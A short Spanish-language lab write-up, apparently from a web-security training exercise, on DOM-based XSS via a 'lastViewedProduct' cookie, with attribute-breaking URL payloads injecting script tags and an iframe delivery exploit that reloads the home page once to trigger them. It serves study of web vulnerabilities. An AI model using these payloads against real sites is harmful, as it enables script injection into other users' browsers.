# Manipulación de cookies vía DOM

Tags: #XSS-DOM #JavaScript #BurpSuite 

```bash 
En este lab se encuentra una vulnerabilidad de tipo XSS basada en la manipulación de cookies mediante JavaScript en el lado del cliente. La web almacena en una cookie llamada lastViewedProduct la última URL de producto visitada, la cual es luego procesada sin validación.


Notas:
	1. Este lab solo funciona con Edge 
```

```javascript 
// Código donde se acontece la inyección y aparece 'lastViewProduct'

<section class="top-links">
	<a href=/>Home</a><p>|</p>
	<a href='https://web.com/product?productId=9'>Last viewed product</a><p>|</p>
</section>


// Se hace en la url y se muestra al regresar a 'Home' en la parte de 'Last viewed product'

https://web.com/product?productId=1&'><h1>Hola</h1>   
https://web.com/product?productId=1&'><script>alert(0)</script>
https://web.com/product?productId=1&'><script>print()</script>
```

```javascript 
// Se debe de mantener la cookie de sesión en la redirección 

<iframe src="https://web.com/product?productId=1&'><script>alert(0)</script>" onload="if(!window.x)this.src='https://web.com/';window.x=1;"></iframe>


Notas:
	1. Crear la variable x y asignarle el numero 1 hará que solo se entre al bucle una vez y de ahí no vuelva a entrar ya que al principio de la condición x no tiene valor 
	2. Colocar la función print(0) en lugar de alert(0)
```